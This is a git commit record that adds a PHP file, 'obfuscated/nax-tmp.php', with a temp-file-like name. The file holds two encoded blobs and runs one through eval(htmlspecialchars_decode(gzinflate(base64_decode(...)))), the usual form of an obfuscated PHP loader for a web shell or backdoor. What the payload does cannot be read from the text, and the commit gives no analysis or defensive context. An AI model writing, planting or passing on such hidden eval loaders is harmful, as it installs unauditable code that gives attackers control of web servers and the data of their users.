4d99034ca73fba0505ae66565a7a403695e1c6ce
Muhammad Rasyad <57721604+nastar-id@users.noreply.github.com>
2023-12-28 11:32:26 +0700

    Create nax-tmp.php

---
+++ obfuscated/nax-tmp.php
@@ -0,0 +1,6 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "\x3d\x3dgz4m/\x62GHLYfMtqowTMjiPxL\x63vfEf/oPUzXsdSej\x2bTE8j2klNL\x61E7nfRTuUydi\x2beNLrNORt3lKXrWguS4k2gw8UYu02Ks3kGfvk3GW85N1zRf\x61z\x425X\x62h\x61607dDnt2WR\x62gS6f2\x61\x43Jtx3w\x2bLvoYpVDP5\x638hUuT\x62\x42V/H\x41m\x63V0/THQ6t\x43vKIe5k2n\x62Uf\x41Ise\x63EfR\x2b\x42QRwl\x62\x62eox08t1gn\x418zIEtf8W\x617gpKXz\x2bHv\x42pkyP3z0\x63gw7DISJ7VuJY\x42v5gLOGGYyj354PZ81LYZTvUYRduJFeLGJlqgF4rPzv\x426YG\x427KulHMO\x42D\x623jNd1Y6\x63h561jDOMYy\x42rOXoGUwKqFMnquzZXdykpwwXJW3Jo45lNM22r\x62Q6rzYUSiS5oplThMtXzNoJ\x63\x43I\x41hkH56tSZPr\x63hLXV29s5izuzMz\x43UeoKvzEX8702h0xelQ\x61H\x62\x42LIklEe4kJXm6WMV3WJU\x42qfo8R8\x43\x42ID7WQSVn/tGgU\x42wJe\x2bL\x61\x41dFg/dGgY\x42wJe\x2bLZ\x41tFg/NGg\x63\x42wJe\x2bLY\x419Fg/9Fgg\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
